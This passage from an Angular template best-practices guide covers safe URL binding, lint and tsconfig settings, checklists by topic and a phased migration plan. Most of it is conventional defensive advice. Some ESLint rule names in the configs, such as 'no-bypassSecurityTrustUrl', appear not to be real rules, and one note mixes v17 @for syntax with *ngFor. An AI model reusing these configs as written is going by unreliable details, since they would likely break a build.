    return this.http.get<User>(`/api/users/${id}`);
  }
}

// Frontend assumes URL is safe
@Component({
  selector: 'app-user-profile',
  template: `
    <a [href]="user.website" target="_blank" rel="noopener noreferrer">
      Visit website
    </a>
  `
})
export class UserProfileComponent {
  @Input() user!: User; // website already validated on backend
}
```

**Notes for Modern Angular:**
- **Default behavior:** Angular sanitizes href bindings by default
- **Non-standard protocols:** `javascript:`, `data:`, `vbscript:` are blocked
- **External links:** Always use `target="_blank" rel="noopener noreferrer"` to prevent window hijacking
- **rel="noopener"** prevents `window.opener` attacks
- **Backend validation:** Always validate URLs on server too

**Recommended Lint Rules:**
```json
{
  "no-bypassSecurityTrustUrl": "error"
}
```

**Best Practices Checklist:**
- ✅ Sanitize user-provided URLs
- ✅ Use DomSanitizer for non-standard URLs
- ✅ Whitelist allowed protocols (http, https, mailto, tel)
- ✅ Use `target="_blank" rel="noopener noreferrer"` for external links
- ✅ Validate URLs on backend
- ✅ Never trust user input for URLs

---

## RECOMMENDED LINT RULES & CONFIGURATION

### ESLint Configuration for Angular Templates

```json
{
  "extends": [
    "plugin:@angular-eslint/recommended",
    "plugin:@angular-eslint/template/recommended"
  ],
  "rules": {
    "@angular-eslint/prefer-on-push-component-change-detection": "warn",
    "@angular-eslint/template/use-track-by-function": "error",
    "@angular-eslint/template/no-negated-async": "error",
    "@angular-eslint/template/no-call-expression": "warn",
    "no-two-way-binding-on-inputs": "error",
    "no-bypassSecurityTrustHtml": "error",
    "no-bypassSecurityTrustUrl": "error"
  }
}
```

### TypeScript Compiler Options (tsconfig.json)

```json
{
  "compilerOptions": {
    "strict": true,
    "noImplicitAny": true,
    "strictNullChecks": true,
    "strictFunctionTypes": true
  },
  "angularCompilerOptions": {
    "strictTemplates": true,
    "strictAttributeTypes": true,
    "strictSafeNavigationTypes": true,
    "strictDomLocalRefTypes": true,
    "strictOutputEventTypes": true,
    "strictDomEventTypes": true,
    "strictContextGenerics": true,
    "strictLiteralTypes": true
  }
}
```

---

## BEST PRACTICES CHECKLIST (QUICK REFERENCE)

### Structural Directives
- ✅ Use `*ngIf` with `let` syntax or safe navigation operator
- ✅ Separate `*ngIf` and `*ngFor` on different elements
- ✅ Always use `trackBy` function with `*ngFor`; v17+ `track` is required
- ✅ Avoid deeply nested conditional structures

### Data Binding
- ✅ Keep template expressions simple; move logic to component
- ✅ Use computed signals for derived data
- ✅ Use safe navigation operator (`?.`) for nullable properties
- ✅ Enable `strictTemplates: true` in tsconfig
- ✅ Update objects immutably; never mutate `@Input` objects

### Forms
- ✅ Use Reactive Forms for anything beyond trivial inputs
- ✅ Reset form after successful submission
- ✅ Separate validation logic from template
- ✅ Use FormBuilder for fluent form definition
- ✅ Implement async validation for server-side checks

### Pipes
- ✅ Keep pipes pure by default
- ✅ Use component logic for expensive calculations
- ✅ Use `shareReplay(1)` with async pipe in components
- ✅ Use `let` syntax to subscribe to observables once

### Performance
- ✅ Use CDK virtual scrolling for lists > 100 items
- ✅ Implement `trackBy` for all `*ngFor` directives
- ✅ Use `ChangeDetectionStrategy.OnPush` on presentational components
- ✅ Avoid impure pipes; use memoized computed properties instead
- ✅ Memoize expensive calculations with signals or observables

### Component Communication
- ✅ Use explicit @Input/@Output instead of two-way binding
- ✅ Emit immutable copies, not mutations
- ✅ Consider container/presentational pattern for complex components
- ✅ Use signals for mutable state (v17+)

### Accessibility
- ✅ Use semantic HTML elements
- ✅ Associate all `<input>` elements with `<label>`
- ✅ Include ARIA labels and descriptions
- ✅ Ensure keyboard navigation support
- ✅ Test with screen readers
- ✅ Verify color contrast ratios (4.5:1 minimum)

### Security
- ✅ Never bind user HTML directly; use DomSanitizer
- ✅ Sanitize external URLs; whitelist protocols
- ✅ Validate on backend too (defense in depth)
- ✅ Use `target="_blank" rel="noopener noreferrer"` for external links
- ✅ Keep Angular and dependencies updated

### Internationalization
- ✅ No hardcoded user-facing text
- ✅ Mark all translatable strings with i18n
- ✅ Use meaningful translation IDs
- ✅ Extract translations regularly

---

## MIGRATION GUIDE: From Anti-Patterns to Best Practices

### Phase 1: Immediate (High Impact, Low Effort)
1. Add `trackBy` to all `*ngFor` directives
2. Enable `strictTemplates: true` in tsconfig
3. Replace nested `*ngIf` with safe navigation operator
4. Add `ChangeDetectionStrategy.OnPush` to presentational components
5. Remove impure pipes; move logic to component

### Phase 2: Medium Term (Medium Impact, Medium Effort)
1. Migrate template-driven forms to Reactive Forms
2. Add proper ARIA attributes and labels
3. Implement DomSanitizer for user-generated content
4. Separate structural directives (`*ngIf` from `*ngFor`)
5. Add i18n integration

### Phase 3: Long Term (Refactoring)
1. Migrate to v17+ standalone components
2. Adopt signals and computed properties
3. Implement container/presentational pattern
4. Add virtual scrolling to large lists
5. Implement proper error handling and loading states

---

## SUMMARY

Angular template anti-patterns stem from incomplete understanding of change detection, security implications, and performance characteristics. The best practices guide provided covers:

- **15 major anti-patterns** across 8 categories
- **Multiple solution approaches** for each anti-pattern
- **Modern Angular best practices** (v15+, emphasizing v17+ features)
- **Security, accessibility, and performance** considerations
- **Actionable checklists** and lint configurations
- **Code examples** demonstrating bad vs. good patterns

This guide should serve as a reference for code reviews, team onboarding, and architectural decisions. Regularly refer to it during development to catch anti-patterns early and maintain high code quality across your Angular application.
